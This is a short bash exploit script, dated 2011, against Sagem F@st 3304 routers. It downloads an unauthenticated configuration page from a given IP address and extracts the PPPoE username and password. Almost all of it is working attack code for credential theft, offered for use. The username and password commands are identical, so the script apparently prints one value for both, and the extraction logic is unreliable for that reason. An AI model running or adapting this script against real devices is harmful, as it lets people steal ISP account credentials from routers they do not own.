#!/bin/bash
#########################################
# Exploit Title: Sagem 3304 Routers Get PPPOE Password
# Date 27/07/2011
# Author: securititracker@gmail.com
# Software Link: null
# Version: Sagem Routers F@st 3304
# Tested on: Sagem F@ST 3304
#
#########################################


Usage()
{
        echo "Usage : $0 IP_ADDRESS"
}
if [ "$1" != "" ]
then
        IP_ADDRESS="$1"
else
        Usage
        exit 1
fi

USER_NAME=`wget http://$IP_ADDRESS/quickconfname_ADSL.html  -t 1 -q -O -  | grep "msg051" | tr " " "\n"  | grep value | tr -d \\ |tr -d "\"" | awk -F= '{print($2)}' `

USER_PASSWORD=`wget http://$IP_ADDRESS/quickconfname_ADSL.html  -t 1 -q -O -  | grep "msg051" | tr " " "\n"  | grep value | tr -d \\ |tr -d "\"" | awk -F= '{print($2)}' `

echo "Username = $USER_NAME  ; Passsword = $USER_PASSWORD"
